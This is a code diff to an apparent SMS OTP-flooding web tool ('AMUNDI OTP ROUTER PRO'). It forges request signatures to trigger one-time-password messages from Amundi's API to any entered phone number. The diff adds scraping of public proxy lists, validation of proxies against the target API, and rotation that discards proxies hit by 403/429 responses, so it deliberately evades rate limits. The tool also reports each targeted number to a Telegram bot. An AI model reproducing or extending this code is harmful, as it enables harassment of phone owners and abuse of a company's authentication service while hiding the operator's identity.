@@ -4,6 +4,7 @@ import hashlib
 import threading
 import requests
 from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from flask import Flask, jsonify, render_template_string, request
 
 app = Flask(__name__)
@@ -22,28 +23,35 @@ STATE = {
     "otp_sent": 0,
     "otp_failed": 0,
     "total_numbers": 0,
+    "proxies_fetched": 0,
+    "proxies_live": 0,
     "logs": [],
     "is_sending": False,
     "current_number": None,
-    "last_response": None
+    "last_response": None,
+    "proxy_in_use": None
 }
 
+PROXY_QUEUE = []
+PROXY_LOCK = threading.Lock()
 LOG_LOCK = threading.Lock()
+BG_THREADS_STARTED = False
 
 # --- LOGGING ---
-def log_sys(msg, level="info", target="N/A"):
+def log_sys(msg, level="info", target="N/A", proxy="N/A"):
     with LOG_LOCK:
         # Hide last 5 digits of phone number
-        if target and len(target) >= 10 and target.isdigit():
-            hidden_target = target[:5] + "*****"
+        if target and len(str(target)) >= 10 and str(target).isdigit():
+            hidden_target = str(target)[:5] + "*****"
         else:
-            hidden_target = target
+            hidden_target = str(target)
         
         entry = {
             "time": datetime.now().strftime("%H:%M:%S"),
             "message": msg,
             "level": level,
-            "target": hidden_target
+            "target": hidden_target,
+            "proxy": proxy
         }
         STATE["logs"].insert(0, entry)
         if len(STATE["logs"]) > 500:
@@ -78,6 +86,131 @@ Status: {status}
         log_sys(f"TELEGRAM: Failed to send - {str(e)}", "error")
         return False
 
+# --- PROXY FUNCTIONS ---
+def fetch_proxies():
+    """Fetch proxies from multiple sources."""
+    sources = [
+        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=elite",
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
+        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
+        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/http.txt"
+    ]
+    
+    proxies = set()
+    for url in sources:
+        try:
+            resp = requests.get(url, timeout=10)
+            if resp.status_code == 200:
+                for line in resp.text.split('\n'):
+                    proxy = line.strip()
+                    if proxy and ":" in proxy and not proxy.startswith('#'):
+                        proxies.add(proxy)
+        except:
+            continue
+    
+    return list(proxies)
+
+def test_proxy(proxy):
+    """Quickly test if proxy is working."""
+    proxy_dict = {
+        "http": f"http://{proxy}",
+        "https": f"http://{proxy}"
+    }
+    try:
+        start = time.time()
+        response = requests.get(
+            "http://httpbin.org/ip",
+            proxies=proxy_dict,
+            timeout=5
+        )
+        if response.status_code == 200 and time.time() - start < 3:
+            return proxy
+    except:
+        pass
+    return None
+
+def validate_proxy(proxy):
+    """Validate proxy against Amundi API."""
+    proxy_dict = {
+        "http": f"http://{proxy}",
+        "https": f"http://{proxy}"
+    }
+    
+    try:
+        test_phone = "9999999999"
+        payload = {"phone": test_phone, "type": 10}
+        sign, timestamp = generate_sign_and_timestamp(payload)
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36",
+            "Content-Type": "application/json",
+            "Origin": "https://h5.amundi-fund.com",
+            "Referer": "https://h5.amundi-fund.com/d2c/index.html?code=6eu72P&haggleId=5078091",
+            "timestamp": timestamp,
+            "sign": sign
+        }
+        
+        response = requests.post(
+            "https://h5.amundi-fund.com/api/sso/common/send",
+            json=payload,
+            headers=headers,
+            proxies=proxy_dict,
+            timeout=8
+        )
+        
+        if response.status_code == 200:
+            return proxy
+    except:
+        pass
+    return None
+
+def proxy_manager():
+    """Background thread to maintain proxy pool."""
+    while True:
+        with PROXY_LOCK:
+            if len(PROXY_QUEUE) < 20:
+                log_sys("SYSTEM: Fetching fresh proxies...", "info")
+                
+                # Fetch raw proxies
+                raw_proxies = fetch_proxies()
+                STATE["proxies_fetched"] += len(raw_proxies)
+                
+                if raw_proxies:
+                    # Fast test proxies
+                    log_sys(f"SYSTEM: Testing {len(raw_proxies)} proxies...", "info")
+                    working = []
+                    
+                    with ThreadPoolExecutor(max_workers=50) as executor:
+                        futures = [executor.submit(test_proxy, p) for p in raw_proxies[:200]]
+                        for future in as_completed(futures):
+                            result = future.result(timeout=2)
+                            if result:
+                                working.append(result)
+                    
+                    if working:
+                        log_sys(f"SYSTEM: {len(working)} proxies passed initial test", "info")
+                        
+                        # Validate against Amundi API
+                        log_sys(f"SYSTEM: Validating against Amundi API...", "info")
+                        validated = []
+                        
+                        with ThreadPoolExecutor(max_workers=20) as executor:
+                            futures = [executor.submit(validate_proxy, p) for p in working[:50]]
+                            for future in as_completed(futures):
+                                result = future.result(timeout=2)
+                                if result:
+                                    validated.append(result)
+                        
+                        with PROXY_LOCK:
+                            PROXY_QUEUE.extend(validated)
+                            STATE["proxies_live"] = len(PROXY_QUEUE)
+                        
+                        log_sys(f"SYSTEM: {len(validated)} proxies validated!", "success")
+        
+        time.sleep(30)
+
 # --- AMUNDI OTP GENERATION ---
 def generate_sign_and_timestamp(payload_dict):
     """Generate MD5 signature for Amundi API."""
@@ -99,8 +232,13 @@ def generate_sign_and_timestamp(payload_dict):
     
     return sign, timestamp_str
 
-def send_otp(phone):
-    """Send OTP to Amundi API."""
+def send_otp_with_proxy(phone, proxy):
+    """Send OTP through specific proxy."""
+    proxy_dict = {
+        "http": f"http://{proxy}",
+        "https": f"http://{proxy}"
+    }
+    
     payload = {"phone": phone, "type": 10}
     sign, timestamp = generate_sign_and_timestamp(payload)
     
@@ -118,7 +256,8 @@ def send_otp(phone):
             "https://h5.amundi-fund.com/api/sso/common/send",
             json=payload,
             headers=headers,
-            timeout=15
+            proxies=proxy_dict,
+            timeout=10
         )
         
         try:
@@ -132,38 +271,89 @@ def send_otp(phone):
 
 # --- BACKGROUND WORKER ---
 def process_otp(phone):
-    """Process OTP in background thread."""
+    """Process OTP using proxy pool."""
     global STATE
     
     STATE["is_sending"] = True
     STATE["current_number"] = phone
     log_sys(f"Processing OTP request", "info", target=phone)
     
-    # Send initial notification to Telegram (not logged)
+    # Send initial notification to Telegram
     send_telegram_message(phone, "PROCESSING")
     
-    # Send OTP
-    status_code, response_data = send_otp(phone)
+    # Try proxies until one works or we run out
+    max_attempts = 30
+    attempts = 0
+    success = False
     
-    if status_code == 200:
-        STATE["otp_sent"] += 1
-        STATE["total_numbers"] += 1
-        STATE["last_response"] = response_data
-        log_sys(f"✅ OTP SENT successfully!", "success", target=phone)
+    while attempts < max_attempts and not success:
+        with PROXY_LOCK:
+            if not PROXY_QUEUE:
+                log_sys("SYSTEM: No proxies available, waiting...", "warn")
+                time.sleep(2)
+                continue
+            
+            proxy = PROXY_QUEUE.pop(0)
+            STATE["proxy_in_use"] = proxy
         
-        # Send success to Telegram with response (not logged)
-        send_telegram_message(phone, "SUCCESS ✅", response_data)
-    else:
-        STATE["otp_failed"] += 1
-        log_sys(f"❌ OTP FAILED - Status: {status_code}", "error", target=phone)
+        attempts += 1
+        log_sys(f"Trying proxy {attempts}/{max_attempts}", "info", target=phone, proxy=proxy)
         
-        # Send failure to Telegram with response (not logged)
-        send_telegram_message(phone, f"FAILED ❌ ({status_code})", response_data)
+        status_code, response_data = send_otp_with_proxy(phone, proxy)
+        
+        if status_code == 200:
+            # Success!
+            STATE["otp_sent"] += 1
+            STATE["total_numbers"] += 1
+            STATE["last_response"] = response_data
+            log_sys(f"✅ OTP SENT successfully!", "success", target=phone, proxy=proxy)
+            
+            # Send success to Telegram
+            send_telegram_message(phone, "SUCCESS ✅", response_data)
+            
+            # Put proxy back in queue for future use
+            with PROXY_LOCK:
+                PROXY_QUEUE.append(proxy)
+            
+            success = True
+            break
+            
+        elif status_code == 403 or status_code == 429:
+            # Proxy is blocked or rate limited, discard it
+            log_sys(f"Proxy blocked/rate limited ({status_code})", "warn", target=phone, proxy=proxy)
+            STATE["otp_failed"] += 1
+            
+        else:
+            # Other error, put proxy back for another try
+            log_sys(f"Failed with status {status_code}", "warn", target=phone, proxy=proxy)
+            STATE["otp_failed"] += 1
+            
+            with PROXY_LOCK:
+                PROXY_QUEUE.append(proxy)
+        
+        # Small delay between attempts
+        time.sleep(0.5)
+    
+    if not success:
+        log_sys(f"❌ OTP FAILED - All proxies exhausted", "error", target=phone)
+        send_telegram_message(phone, f"FAILED ❌ - All proxies exhausted", {"status": "error", "message": "No working proxies"})
     
     STATE["is_sending"] = False
     STATE["current_number"] = None
+    STATE["proxy_in_use"] = None
 
 # --- FLASK ROUTES ---
+def init_background_threads():
+    global BG_THREADS_STARTED
+    if not BG_THREADS_STARTED:
+        log_sys("SYSTEM: Initializing proxy manager...", "info")
+        threading.Thread(target=proxy_manager, daemon=True).start()
+        BG_THREADS_STARTED = True
+
+@app.before_request
+def activate_threads():
+    init_background_threads()
+
 @app.route('/')
 def index():
     return render_template_string(HTML_TEMPLATE)
@@ -179,7 +369,6 @@ def send_otp_route():
     if not phone:
         return jsonify({"status": "error", "message": "Phone number required"}), 400
     
-    # Validate 10 digits starting with 6,7,8,9
     if not phone.isdigit() or len(phone) != 10:
         return jsonify({"status": "error", "message": "Must be exactly 10 digits"}), 400
     
@@ -202,14 +391,20 @@ def stats():
     hours, remainder = divmod(uptime_seconds, 3600)
     minutes, seconds = divmod(remainder, 60)
     
+    with PROXY_LOCK:
+        proxy_count = len(PROXY_QUEUE)
+    
     return jsonify({
         "uptime": f"{hours:02d}h {minutes:02d}m {seconds:02d}s",
         "started_at": STATE["start_time_str"],
         "otp_sent": STATE["otp_sent"],
         "otp_failed": STATE["otp_failed"],
         "total_numbers": STATE["total_numbers"],
+        "proxies_fetched": STATE["proxies_fetched"],
+        "proxies_live": proxy_count,
         "is_sending": STATE["is_sending"],
         "current_number": STATE["current_number"],
+        "proxy_in_use": STATE["proxy_in_use"],
         "last_response": STATE["last_response"],
         "logs": STATE["logs"][:80]
     })
@@ -218,6 +413,7 @@ def stats():
 def clear_state():
     STATE["current_number"] = None
     STATE["last_response"] = None
+    STATE["proxy_in_use"] = None
     return jsonify({"status": "success"})
 
 # --- UI TEMPLATE ---
@@ -227,7 +423,7 @@ HTML_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AMUNDI OTP ROUTER</title>
+    <title>AMUNDI OTP ROUTER PRO</title>
     <style>
         * {
             margin: 0;
@@ -318,17 +514,14 @@ HTML_TEMPLATE = """
         
         .stats-top {
             display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 15px;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 12px;
             margin-bottom: 25px;
-            max-width: 600px;
-            margin-left: auto;
-            margin-right: auto;
         }
         
         .stat-card {
             border: 1px solid #00ff41;
-            padding: 15px 10px;
+            padding: 12px 10px;
             text-align: center;
             background: rgba(0, 255, 65, 0.03);
             transition: all 0.3s;
@@ -339,22 +532,24 @@ HTML_TEMPLATE = """
         }
         
         .stat-card .label {
-            font-size: 0.7em;
+            font-size: 0.65em;
             color: #00aa33;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
         
         .stat-card .value {
-            font-size: 28px;
+            font-size: 22px;
             font-weight: bold;
-            margin-top: 5px;
+            margin-top: 3px;
             text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
         }
         
         .stat-card.success .value { color: #00ff41; }
         .stat-card.danger .value { color: #ff0040; }
         .stat-card.info .value { color: #00ccff; }
+        .stat-card.warning .value { color: #ffaa00; }
+        .stat-card.cyan .value { color: #00ffff; }
         
         .input-section {
             background: rgba(0, 20, 0, 0.8);
@@ -512,13 +707,13 @@ HTML_TEMPLATE = """
         .log-table {
             width: 100%;
             border-collapse: collapse;
-            font-size: 12px;
+            font-size: 11px;
         }
         
         .log-table th {
             background: #002200;
             color: #00ff41;
-            padding: 8px 6px;
+            padding: 6px 4px;
             text-align: left;
             position: sticky;
             top: 0;
@@ -526,13 +721,13 @@ HTML_TEMPLATE = """
             border-bottom: 1px solid #00ff41;
             text-transform: uppercase;
             letter-spacing: 1px;
-            font-size: 0.7em;
+            font-size: 0.65em;
         }
         
         .log-table td {
-            padding: 6px 6px;
+            padding: 4px 4px;
             border-bottom: 1px solid #003300;
-            font-size: 0.75em;
+            font-size: 0.7em;
         }
         
         .log-table tr:hover {
@@ -594,11 +789,18 @@ HTML_TEMPLATE = """
             margin-top: 8px;
         }
         
+        .proxy-status {
+            color: #00aa33;
+            font-size: 0.8em;
+            text-align: center;
+            margin-top: 5px;
+        }
+        
         @media (max-width: 768px) {
             .header h1 { font-size: 1.5em; letter-spacing: 4px; }
             .input-row { flex-direction: column; }
             .input-row input { width: 100%; }
-            .stats-top { grid-template-columns: 1fr; max-width: 300px; }
+            .stats-top { grid-template-columns: repeat(3, 1fr); }
         }
     </style>
 </head>
@@ -608,8 +810,8 @@ HTML_TEMPLATE = """
     
     <div class="container">
         <div class="header">
-            <h1 class="glitch">⧩ AMUNDI OTP ROUTER</h1>
-            <div class="subtitle">SECURE TERMINAL // 100% ANONYMOUS</div>
+            <h1 class="glitch">⧩ AMUNDI OTP ROUTER PRO</h1>
+            <div class="subtitle">SMART PROXY SYSTEM // 100% ANONYMOUS</div>
             <div style="margin-top: 10px;">
                 <span class="anonymous-badge">🔒 NO DATA STORED</span>
                 <span id="status_badge" class="status-badge status-idle">● IDLE</span>
@@ -630,6 +832,14 @@ HTML_TEMPLATE = """
                 <div class="label">👤 TOTAL NUMBERS</div>
                 <div class="value" id="val_numbers">0</div>
             </div>
+            <div class="stat-card warning">
+                <div class="label">🌐 PROXIES FETCHED</div>
+                <div class="value" id="val_proxies">0</div>
+            </div>
+            <div class="stat-card cyan">
+                <div class="label">🟢 PROXIES LIVE</div>
+                <div class="value" id="val_live">0</div>
+            </div>
         </div>
         
         <div class="input-section">
@@ -640,6 +850,7 @@ HTML_TEMPLATE = """
                 <button class="btn btn-danger" onclick="clearNumber()">✕ CLEAR</button>
             </div>
             <div class="hint">Enter 10-digit number starting with 6, 7, 8, or 9</div>
+            <div class="proxy-status" id="proxyStatus">🔄 Proxy pool: 0 available</div>
             
             <div class="buttons-row">
                 <button class="btn btn-telegram" onclick="window.open('https://t.me/drdevstudio', '_blank')">
@@ -657,19 +868,20 @@ HTML_TEMPLATE = """
             <table class="log-table">
                 <thead>
                     <tr>
-                        <th style="width:15%;">TIME</th>
-                        <th style="width:55%;">EVENT</th>
-                        <th style="width:30%;">TARGET</th>
+                        <th style="width:12%;">TIME</th>
+                        <th style="width:43%;">EVENT</th>
+                        <th style="width:20%;">TARGET</th>
+                        <th style="width:25%;">PROXY</th>
                     </tr>
                 </thead>
                 <tbody id="logBody">
-                    <tr><td colspan="3" style="color:#004400;text-align:center;">⏳ INITIALIZING SECURE TERMINAL...</td></tr>
+                    <tr><td colspan="4" style="color:#004400;text-align:center;">⏳ INITIALIZING PROXY SYSTEM...</td></tr>
                 </tbody>
             </table>
         </div>
         
         <div class="footer">
-            ⚡ SYS.TERMINAL v3.0 // ENCRYPTED CONNECTION // NO LOGS STORED
+            ⚡ SYS.TERMINAL v4.0 // PROXY-ENABLED // ENCRYPTED CONNECTION
         </div>
     </div>
     
@@ -683,6 +895,9 @@ HTML_TEMPLATE = """
                     document.getElementById('val_sent').innerText = data.otp_sent;
                     document.getElementById('val_failed').innerText = data.otp_failed;
                     document.getElementById('val_numbers').innerText = data.total_numbers;
+                    document.getElementById('val_proxies').innerText = data.proxies_fetched || 0;
+                    document.getElementById('val_live').innerText = data.proxies_live || 0;
+                    document.getElementById('proxyStatus').innerText = `🔄 Proxy pool: ${data.proxies_live || 0} available`;
                     
                     isSending = data.is_sending;
                     
@@ -709,6 +924,7 @@ HTML_TEMPLATE = """
                             <td>${log.time}</td>
                             <td>${log.message}</td>
                             <td>${log.target}</td>
+                            <td style="font-size:0.65em;color:#006600;">${log.proxy || '—'}</td>
                         `;
                         tbody.appendChild(tr);
                     });
@@ -754,11 +970,10 @@ HTML_TEMPLATE = """
                 if (data.status === 'busy') {
                     alert('⏳ System is busy. Please wait.');
                 } else {
-                    // Clear input after sending
                     document.getElementById('phoneInput').value = '';
                     const box = document.getElementById('responseBox');
                     box.className = 'response-box active';
-                    box.innerHTML = `📡 OTP request sent. Check logs for status.`;
+                    box.innerHTML = `📡 OTP request sent. Smart proxy system will find best route.`;
                 }
             })
             .catch(err => {
@@ -802,4 +1017,5 @@ HTML_TEMPLATE = """
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
+    init_background_threads()
     app.run(host='0.0.0.0', port=port, debug=False)
